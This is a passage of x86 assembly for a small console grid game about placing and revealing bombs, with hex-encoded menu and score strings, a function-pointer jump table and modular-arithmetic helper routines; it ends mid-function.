   .long   FuncPtr_0x8048f60 # 29 key=6418 x=50 y=18 index= 29
   .long   FuncPtr_0x80494e0 # 30 key=7826 x=61 y=18 index= 30
   .long   0x0
   .long   FuncPtr_0x804b6ee # 32 key=160 x=1 y=32 index= 32
   .long   0x0
   .long   FuncPtr_0x8049a70 # 34 key=9250 x=72 y=34 index= 34
   .long   FuncPtr_0x8049b70 # 35 key=9506 x=74 y=34 index= 35
   .long   FuncPtr_0x80495f0 # 36 key=8098 x=63 y=34 index= 36
   .long   FuncPtr_0x804a770 # 37 key=12578 x=98 y=34 index= 37
   .long   FuncPtr_0x804b5f3 # 38 key=16293 x=127 y=37 index= 38
   .long   FuncPtr_0x8049c70 # 39 key=9762 x=76 y=34 index= 39
   .long   FuncPtr_0x80484f0 # 40 key=3746 x=29 y=34 index= 40
   .long   FuncPtr_0x80486f0 # 41 key=4258 x=33 y=34 index= 41
   .long   FuncPtr_0x8048b70 # 42 key=5410 x=42 y=34 index= 42
   .long   FuncPtr_0x8048ef0 # 43 key=6306 x=49 y=34 index= 43
   .long   FuncPtr_0x804aef0 # 44 key=14498 x=113 y=34 index= 44
   .long   FuncPtr_0x8048ff0 # 45 key=6562 x=51 y=34 index= 45
   .long   FuncPtr_0x8049270 # 46 key=7202 x=56 y=34 index= 46
   .long   FuncPtr_0x804b470 # 47 key=15906 x=124 y=34 index= 47
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a380 # 50 key=11570 x=90 y=50 index= 50
   .long   FuncPtr_0x804b681 # 51 key=51 x=0 y=51 index= 51
   .long   FuncPtr_0x804a480 # 52 key=11826 x=92 y=50 index= 52
   .long   FuncPtr_0x804a400 # 53 key=11698 x=91 y=50 index= 53
   .long   FuncPtr_0x8049680 # 54 key=8242 x=64 y=50 index= 54
   .long   FuncPtr_0x804b200 # 55 key=15282 x=119 y=50 index= 55
   .long   FuncPtr_0x804a500 # 56 key=11954 x=93 y=50 index= 56
   .long   FuncPtr_0x804b380 # 57 key=15666 x=122 y=50 index= 57
   .long   FuncPtr_0x804aa00 # 58 key=13234 x=103 y=50 index= 58
   .long   FuncPtr_0x804aa80 # 59 key=13362 x=104 y=50 index= 59
   .long   FuncPtr_0x804b300 # 60 key=15538 x=121 y=50 index= 60
   .long   FuncPtr_0x8048100 # 61 key=2738 x=21 y=50 index= 61
   .long   FuncPtr_0x8048400 # 62 key=3506 x=27 y=50 index= 62
   .long   FuncPtr_0x804a700 # 63 key=12466 x=97 y=50 index= 63
   .long   FuncPtr_0x8048880 # 64 key=4658 x=36 y=50 index= 64
   .long   0x0
   .long   FuncPtr_0x804a390 # 66 key=11586 x=90 y=66 index= 66
   .long   FuncPtr_0x8049310 # 67 key=7362 x=57 y=66 index= 67
   .long   FuncPtr_0x804a490 # 68 key=11842 x=92 y=66 index= 68
   .long   FuncPtr_0x804a790 # 69 key=12610 x=98 y=66 index= 69
   .long   FuncPtr_0x804b613 # 70 key=16325 x=127 y=69 index= 70
   .long   FuncPtr_0x8049c90 # 71 key=9794 x=76 y=66 index= 71
   .long   FuncPtr_0x8049810 # 72 key=8642 x=67 y=66 index= 72
   .long   FuncPtr_0x804a990 # 73 key=13122 x=102 y=66 index= 73
   .long   FuncPtr_0x8048290 # 74 key=3138 x=24 y=66 index= 74
   .long   FuncPtr_0x8048310 # 75 key=3266 x=25 y=66 index= 75
   .long   FuncPtr_0x8048790 # 76 key=4418 x=34 y=66 index= 76
   .long   FuncPtr_0x804b410 # 77 key=15810 x=123 y=66 index= 77
   .long   FuncPtr_0x804b69c # 78 key=78 x=0 y=78 index= 78
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a3a0 # 82 key=11602 x=90 y=82 index= 82
   .long   FuncPtr_0x8049ba0 # 83 key=9554 x=74 y=82 index= 83
   .long   FuncPtr_0x804a4a0 # 84 key=11858 x=92 y=82 index= 84
   .long   FuncPtr_0x80480a0 # 85 key=2642 x=20 y=82 index= 85
   .long   FuncPtr_0x804b2a0 # 86 key=15442 x=120 y=82 index= 86
   .long   FuncPtr_0x8049ea0 # 87 key=10322 x=80 y=82 index= 87
   .long   FuncPtr_0x8049f20 # 88 key=10450 x=81 y=82 index= 88
   .long   FuncPtr_0x804a220 # 89 key=11218 x=87 y=82 index= 89
   .long   FuncPtr_0x80489a0 # 90 key=4946 x=38 y=82 index= 90
   .long   FuncPtr_0x804ae20 # 91 key=14290 x=111 y=82 index= 91
   .long   FuncPtr_0x804a320 # 92 key=11474 x=89 y=82 index= 92
   .long   0x0
   .long   0x0
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a3b0 # 98 key=11618 x=90 y=98 index= 98
   .long   FuncPtr_0x804b5b0 # 99 key=16226 x=126 y=98 index= 99
   .long   FuncPtr_0x8049630 # 100 key=8162 x=63 y=98 index= 100
   .long   FuncPtr_0x804a430 # 101 key=11746 x=91 y=98 index= 101
   .long   FuncPtr_0x80499b0 # 102 key=9058 x=70 y=98 index= 102
   .long   FuncPtr_0x804b230 # 103 key=15330 x=119 y=98 index= 103
   .long   FuncPtr_0x804b5b5 # 104 key=16231 x=126 y=103 index= 104
   .long   FuncPtr_0x804a6b0 # 105 key=12386 x=96 y=98 index= 105
   .long   FuncPtr_0x804a930 # 106 key=13026 x=101 y=98 index= 106
   .long   FuncPtr_0x804abb0 # 107 key=13666 x=106 y=98 index= 107
   .long   FuncPtr_0x804b639 # 108 key=16363 x=127 y=107 index= 108
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804b6be # 112 key=112 x=0 y=112 index= 112
   .long   0x0
   .long   FuncPtr_0x804a3c0 # 114 key=11634 x=90 y=114 index= 114
   .long   FuncPtr_0x80498c0 # 115 key=8818 x=68 y=114 index= 115
   .long   FuncPtr_0x8049940 # 116 key=8946 x=69 y=114 index= 116
   .long   0x0
   .long   FuncPtr_0x80499c0 # 118 key=9074 x=70 y=114 index= 118
   .long   FuncPtr_0x804a840 # 119 key=12786 x=99 y=114 index= 119
   .long   FuncPtr_0x804b5c5 # 120 key=16247 x=126 y=119 index= 120
   .long   FuncPtr_0x804b3c0 # 121 key=15730 x=122 y=114 index= 121

/*  --------------------- .rodata ----------------------*/
.p2align 2
#.section .rodata # Addresses: 0x804b708 - 0x804bca9 (0x5a2 bytes)
Var_0x804b708:
   .byte 0x25
   .byte 0x73
   .byte 0x00
Var_0x804b70b:
   .long 0x207c2d2d ##d4
   .long 0x792c7828 ##d4
   .long 0x203d2029 ##d4
   .long 0x2c642528 ##d4
   .long 0x20296425 ##d4
   .long 0x6c41207c ##d4
   .long 0x3d657669 ##d4
   .long 0x7c206425 ##d4
   .long 0x6d6f4220 ##d4
   .long 0x64253d62 ##d4
   .long 0xa7c20 ##d4
Var_0x804b737:
   .long 0x6576654c ##d4
   .long 0x25203a6c ##d4
   .long 0x49202c64 ##d4
   .long 0x25203a44 ##d4
   .byte 0x73
   .byte 0x0a
   .byte 0x00
Var_0x804b74a:
   .long 0x20202020 ##d4
   .byte 0x3e
   .byte 0x00
Var_0x804b750:
   .byte 0x4e
   .byte 0x57
   .byte 0x00
Var_0x804b753:
   .byte 0x4e
   .byte 0x45
   .byte 0x00
Var_0x804b756:
   .byte 0x53
   .byte 0x57
   .byte 0x00
Var_0x804b759:
   .byte 0x53
   .byte 0x45
   .byte 0x00
Var_0x804b75c:
   .long Label_0x8049701
Var_0x804b760:
   .long Label_0x8049728
Var_0x804b764:
   .long Label_0x804971a
Var_0x804b768:
   .long Label_0x804970f
Var_0x804b76c:
   .long Label_0x80496b4
Var_0x804b770:
   .long Label_0x8049728
Var_0x804b774:
   .long Label_0x8049736
Var_0x804b778:
   .long Label_0x804971a
Var_0x804b77c:
   .long Label_0x804970f
Var_0x804b780:
   .long 0x54495845 ##d4
   .long 0x2e474e49 ##d4
   .long 0xa2e2e ##d4
Var_0x804b78c:
   .long 0x20646142 ##d4
   .long 0x75706e49 ##d4
   .byte 0x74
   .byte 0x0a
   .byte 0x00
Var_0x804b797:
   .long 0x20646142 ##d4
   .long 0x696f6843 ##d4
   .long 0xa6563 ##d4
Var_0x804b7a3:
   .long 0x65746e45 ##d4
   .long 0x6d612072 ##d4
   .long 0x746e756f ##d4
   .long 0x20666f20 ##d4
   .long 0x656d6974 ##d4
   .long 0x206f7420 ##d4
   .long 0x3a6e7572 ##d4
   .long 0x64255b20 ##d4
   .long 0x5d64252d ##d4
   .long 0x203a3a ##d4
Var_0x804b7cb:
   .long 0x61766e49 ##d4
   .long 0x2064696c ##d4
   .long 0x756f6d61 ##d4
   .long 0x6f20746e ##d4
   .long 0x69742066 ##d4
   .long 0xa656d ##d4
Var_0x804b7e3:
   .long 0x6563694e ##d4
   .long 0x6d6f6220 ##d4
   .long 0x676e6962 ##d4
   .long 0x6f592021 ##d4
   .long 0x61722075 ##d4
   .long 0x64656b63 ##d4
   .long 0x20707520 ##d4
   .long 0x70206425 ##d4
   .long 0x746e696f ##d4
   .long 0xa2e73 ##d4
Var_0x804b80b:
   .long 0x65746e45 ##d4
   .long 0x6f422072 ##d4
   .long 0x4320626d ##d4
   .long 0x64726f6f ##d4
   .long 0x74616e69 ##d4
   .long 0x45207365 ##d4
   .long 0x31203a78 ##d4
   .long 0x202c3030 ##d4
   .long 0x3a303031 ##d4
   .byte 0x3a
   .byte 0x20
   .byte 0x00
Var_0x804b832:
   .long 0x61766e49 ##d4
   .long 0x2064696c ##d4
   .long 0x726f6f63 ##d4
   .long 0x616e6964 ##d4
   .long 0xa736574 ##d4
   .byte 0x00
Var_0x804b847:
   .long 0x27756f59 ##d4
   .long 0x6f206572 ##d4
   .long 0x6f207475 ##d4
   .long 0x6f622066 ##d4
   .long 0x2e73626d ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804b85d:
   .long 0x63637553 ##d4
   .long 0x66737365 ##d4
   .long 0x796c6c75 ##d4
   .long 0x616c7020 ##d4
   .long 0x6465746e ##d4
   .long 0x6d6f6220 ##d4
   .long 0xa2e62 ##d4
Var_0x804b879:
   .long 0x72656854 ##d4
   .long 0x73692065 ##d4
   .long 0x726c6120 ##d4
   .long 0x79646165 ##d4
   .long 0x62206120 ##d4
   .long 0x20626d6f ##d4
   .long 0x65726568 ##d4
   .long 0x7254202e ##d4
   .long 0x6f732079 ##d4
   .long 0x6877656d ##d4
   .long 0x20657265 ##d4
   .long 0x65736c65 ##d4
   .byte 0x2e
   .byte 0x0a
   .byte 0x00
Var_0x804b8ac:
   .byte 0x2c
   .byte 0x00
Var_0x804b8ae:
   .long 0x454d4147 ##d4
   .long 0x414f4220 ##d4
   .long 0xa4452 ##d4
Var_0x804b8ba:
   .long 0x65746e45 ##d4
   .long 0x68532072 ##d4
   .long 0x4320746f ##d4
   .long 0x64726f6f ##d4
   .long 0x74616e69 ##d4
   .long 0x45207365 ##d4
   .long 0x31203a78 ##d4
   .long 0x202c3030 ##d4
   .long 0x3a303031 ##d4
   .byte 0x3a
   .byte 0x20
   .byte 0x00
Var_0x804b8e1:
   .long 0x27756f59 ##d4
   .long 0x6f206572 ##d4
   .long 0x6f207475 ##d4
   .long 0x75622066 ##d4
   .long 0x74656c6c ##d4
   .long 0xa2e73 ##d4
Var_0x804b8f9:
   .long 0x61657247 ##d4
   .long 0x68732074 ##d4
   .long 0x2021746f ##d4
   .long 0x20756f59 ##d4
   .long 0x20746f67 ##d4
   .long 0xa656e6f ##d4
   .byte 0x00
Var_0x804b912:
   .long 0x726f6353 ##d4
   .long 0x203a6465 ##d4
   .long 0x70206425 ##d4
   .long 0x746e696f ##d4
   .byte 0x73
   .byte 0x0a
   .byte 0x00
Var_0x804b925:
   .long 0x20756f59 ##d4
   .long 0x7373696d ##d4
   .long 0x202e6465 ##d4
   .long 0x74746542 ##d4
   .long 0x6c207265 ##d4
   .long 0x206b6375 ##d4
   .long 0x7478656e ##d4
   .long 0x6d697420 ##d4
   .long 0xa2e65 ##d4
Var_0x804b949:
   .long 0x6e616854 ##d4
   .long 0x6620736b ##d4
   .long 0x5020726f ##d4
   .long 0x6979616c ##d4
   .long 0xa676e ##d4
Var_0x804b95d:
   .long 0x454d4147 ##d4
   .long 0x45564f20 ##d4
   .long 0xa2152 ##d4
Var_0x804b969:
   .long 0x656e2041 ##d4
   .long 0x69682077 ##d4
   .long 0x73206867 ##d4
   .long 0x65726f63 ##d4
   .byte 0x21
   .byte 0x21
   .byte 0x0a
Var_0x804b97c:
   .byte 0x0a
   .byte 0x00
Var_0x804b97e:
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x2d2d2020 ##d4
   .long 0x454d4147 ##d4
   .long 0x45564f20 ##d4
   .long 0xa2d2d52 ##d4
   .byte 0x00
Var_0x804b9ab:
   .long 0x4e202e31 ##d4
   .long 0x47207765 ##d4
   .long 0xa656d61 ##d4
   .byte 0x00
Var_0x804b9b8:
   .long 0x51202e32 ##d4
   .long 0xa746975 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804b9c2:
   .long 0x68676948 ##d4
   .long 0x6f635320 ##d4
   .long 0x3d206572 ##d4
   .long 0xa642520 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804b9d4:
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x2d2d2020 ##d4
   .long 0x72616f42 ##d4
   .long 0x48203a64 ##d4
   .long 0x45444449 ##d4
   .long 0xa2d2d4e ##d4
   .byte 0x00
Var_0x804ba05:
   .long 0x53202e31 ##d4
   .long 0x746f6f68 ##d4
   .byte 0x21
   .byte 0x0a
   .byte 0x00
Var_0x804ba10:
   .long 0x52202e32 ##d4
   .long 0x61657665 ##d4
   .long 0x6f42206c ##d4
   .long 0xa647261 ##d4
   .byte 0x00
Var_0x804ba21:
   .long 0x4e202e33 ##d4
   .long 0x47207765 ##d4
   .long 0xa656d61 ##d4
   .byte 0x00
Var_0x804ba2e:
   .long 0x51202e34 ##d4
   .long 0xa746975 ##d4
   .byte 0x00
Var_0x804ba37:
   .long 0x72727543 ##d4
   .long 0x20746e65 ##d4
   .long 0x726f6353 ##d4
   .long 0x203d2065 ##d4
   .long 0x7c206425 ##d4
   .long 0x746f5420 ##d4
   .long 0x54206c61 ##d4
   .long 0x20656d69 ##d4
   .long 0x616d6552 ##d4
   .long 0x6e696e69 ##d4
   .long 0x25203a67 ##d4
   .long 0x207c2064 ##d4
   .long 0x68676948 ##d4
   .long 0x6f635320 ##d4
   .long 0x3d206572 ##d4
   .long 0x20642520 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804ba79:
   .long 0x746f6853 ##d4
   .long 0x65522073 ##d4
   .long 0x6e69616d ##d4
   .long 0x3a676e69 ##d4
   .long 0x20642520 ##d4
   .long 0x6f42207c ##d4
   .long 0x2073626d ##d4
   .long 0x616d6552 ##d4
   .long 0x6e696e69 ##d4
   .long 0x25203a67 ##d4
   .long 0xa0a64 ##d4
Var_0x804baa5:
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x2d2d2020 ##d4
   .long 0x72616f42 ##d4
   .long 0x52203a64 ##d4
   .long 0x41455645 ##d4
   .long 0x2d44454c ##d4
   .byte 0x2d
   .byte 0x0a
   .byte 0x00
Var_0x804bad8:
   .long 0x50202e31 ##d4
   .long 0x6563616c ##d4
   .long 0x6d6f4220 ##d4
   .byte 0x62
   .byte 0x0a
   .byte 0x00
Var_0x804bae7:
   .long 0x4c202e33 ##d4
   .long 0x74207465 ##d4
   .long 0x206d6568 ##d4
   .long 0x216e7552 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804baf9:
   .long 0x4e202e34 ##d4
   .long 0x47207765 ##d4
   .long 0xa656d61 ##d4
   .byte 0x00
Var_0x804bb06:
   .long 0x51202e35 ##d4
   .long 0xa746975 ##d4
   .byte 0x00
Var_0x804bb0f:
   .long 0x656c6553 ##d4
   .long 0x6f697463 ##d4
   .byte 0x6e
   .byte 0x2d
   .byte 0x3a
Var_0x804bb1a:
   .byte 0x20
   .byte 0x00
Var_0x804bb1c:
   .long 0x2077654e ##d4
   .long 0x656d6147 ##d4
   .long 0x202d2d20 ##d4
   .long 0x64616552 ##d4
   .long 0x73202c79 ##d4
   .long 0x202c7465 ##d4
   .long 0xa216f67 ##d4
   .byte 0x00
Var_0x804bb39:
   .long 0x6f666542 ##d4
   .long 0x77206572 ##d4
   .long 0x65622065 ##d4
   .long 0x2e6e6967 ##d4
   .long 0x746e4520 ##d4
   .long 0x61207265 ##d4
   .long 0x6d756e20 ##d4
   .long 0x20726562 ##d4
   .long 0x2d20315b ##d4
   .long 0x39323420 ##d4
   .long 0x37363934 ##d4
   .long 0x5d353932 ##d4
   .long 0x20724f0a ##d4
   .long 0x20796e61 ##d4
   .long 0x626d756e ##d4
   .long 0x202e7265 ##d4
   .long 0x6c276557 ##d4
   .long 0x6966206c ##d4
   .long 0x65727567 ##d4
   .long 0x20746920 ##d4
   .long 0x3a74756f ##d4
   .byte 0x20
   .byte 0x00
Var_0x804bb8f:
   .long 0x20646142 ##d4
   .long 0x75706e69 ##d4
   .byte 0x74
   .byte 0x0a
   .byte 0x00
Var_0x804bb9a:
   .long 0x61766e49 ##d4
   .long 0x2064696c ##d4
   .long 0x626d756e ##d4
   .long 0xa7265 ##d4
Var_0x804bbaa:
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010100 ##d4
   .long 0x1010101 ##d4
   .long 0x1010101 ##d4
   .long 0x1010101 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010000 ##d4
   .long 0x1010101 ##d4
   .long 0x1 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1000000 ##d4
   .long 0x1010101 ##d4
   .long 0x1 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1000000 ##d4
   .long 0x10101 ##d4
Var_0x804bc2a:
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010101 ##d4
   .long 0x1010101 ##d4
   .long 0x101 ##d4
   .long 0x0 ##d4
   .long 0x1010100 ##d4
   .long 0x10101 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010100 ##d4
   .long 0x10101 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
isqrMod:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$44, %esp
	movl	68(%esp), %ecx
	movl	76(%esp), %ebx
	movl	64(%esp), %ebp
	movl	%ecx, 24(%esp)
	movl	24(%esp), %eax
	movl	72(%esp), %ecx
	movl	%ebx, 12(%esp)
	movl	%ebx, 20(%esp)
	movl	$64, %ebx
	mull	%eax
	movl	%ecx, 8(%esp)
	movl	%ecx, 16(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L2:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L2
	movl	%eax, %esi
	movl	24(%esp), %eax
	movl	%edx, %edi
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	mull	%ebp
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 24(%esp)
	movl	16(%esp), %esi
	movl	%edi, 28(%esp)
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L3:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L3
	movl	24(%esp), %esi
	movl	28(%esp), %edi
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	addl	%eax, %esi
	adcl	%edx, %edi
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%esi, (%esp)
	movl	%edi, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, %esi
	movl	%ebp, %eax
	movl	%edx, %edi
	mull	%ebp
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	addl	$44, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
imulMod:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	movl	$64, %ebx
	subl	$60, %esp
	movl	80(%esp), %eax
	movl	84(%esp), %edx
	movl	92(%esp), %ebp
	movl	96(%esp), %esi
	movl	%eax, 40(%esp)
	movl	88(%esp), %eax
	movl	%edx, 24(%esp)
	movl	100(%esp), %edi
	movl	%esi, 8(%esp)
	movl	%eax, 44(%esp)
	movl	%edx, %eax
	mull	%ebp
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%eax, 32(%esp)
	movl	%edx, 36(%esp)
	.p2align 4,,7
	.p2align 3
.L9:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L9
	movl	%eax, 32(%esp)
	movl	44(%esp), %eax
	movl	$32, %ebx
	movl	%edx, 36(%esp)
	mull	24(%esp)
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%eax, 24(%esp)
	movl	%edx, 28(%esp)
	.p2align 4,,7
	.p2align 3
.L10:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L10
	movl	%eax, 24(%esp)
	movl	40(%esp), %eax
	movl	%edx, 28(%esp)
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	mull	%ebp
	movl	$32, %ebp
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	.p2align 4,,7
	.p2align 3
.L11:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebp
	jne	.L11
	movl	%eax, %ecx
	movl	%edx, %ebx
	movl	24(%esp), %eax
	movl	28(%esp), %edx
	addl	32(%esp), %eax
	adcl	36(%esp), %edx
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	movl	%ecx, 20(%esp)
	call	__umoddi3
	movl	20(%esp), %ecx
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	addl	%ecx, %eax
	adcl	%ebx, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, 32(%esp)
	movl	44(%esp), %eax
	movl	%edx, 36(%esp)
	mull	40(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	addl	32(%esp), %eax
	adcl	36(%esp), %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	addl	$60, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
publicExp:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$204, %esp
	leal	56(%esp), %ebp
       movl    (_RAND_Page),%ecx
       movl    0x255(%ecx), %eax
	movl	%eax, 56(%esp)
	movl	$0xC5D5, 60(%esp)
	movl	$0xabd3b0bd, 16(%esp)
	movl	$0x2f2c07d4, 20(%esp)
	leal	184(%esp), %ebx
	movl	%ebx, 40(%esp)
	.p2align 4,,7
	.p2align 3
.L19:
	movl	4(%ebp), %ebx
	movl	0(%ebp), %ecx
	movl	%ebx, %eax
	mull	%ebx
	movl	%ecx, 32(%esp)
	movl	16(%esp), %ecx
	movl	%ebx, 24(%esp)
	movl	20(%esp), %ebx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	movl	%ebx, 12(%esp)
	movl	$64, %ebx
	movl	%ecx, 8(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L17:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L17
	movl	%eax, %esi
	movl	24(%esp), %eax
	movl	%edx, %edi
	mull	32(%esp)
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 24(%esp)
	movl	16(%esp), %esi
	movl	%edi, 28(%esp)
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L18:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L18
	movl	24(%esp), %esi
	movl	28(%esp), %edi
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	addl	%eax, %esi
	adcl	%edx, %edi
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%esi, (%esp)
	movl	%edi, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, %esi
	movl	32(%esp), %eax
	movl	%edx, %edi
	mull	%eax
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%eax, 8(%ebp)
	movl	%edx, 12(%ebp)
	addl	$8, %ebp
	cmpl	40(%esp), %ebp
	jne	.L19
	movl	188(%esp), %edi
	movl	60(%esp), %esi
	movl	56(%esp), %ebx
	movl	16(%esp), %ecx
	movl	%edi, %eax
	movl	184(%esp), %ebp
	mull	%esi
	movl	%ebx, 44(%esp)
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%eax, (%esp)
	movl	%ebx, 12(%esp)
	movl	$64, %ebx
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%ebp, 24(%esp)
	movl	%esi, %ebp
	movl	16(%esp), %esi
	movl	%edi, 40(%esp)
	movl	20(%esp), %edi
	movl	%eax, 32(%esp)
	movl	%edx, 36(%esp)
	.p2align 4,,7
	.p2align 3
.L20:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L20
	movl	%ebp, %esi
	movl	24(%esp), %ebp
	movl	%eax, 32(%esp)
	movl	16(%esp), %ecx
	movl	%edx, 36(%esp)
	movl	20(%esp), %ebx
	movl	40(%esp), %edi
	movl	%ebp, %eax
	mull	%esi
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	movl	%ecx, 8(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	%ebp, 40(%esp)
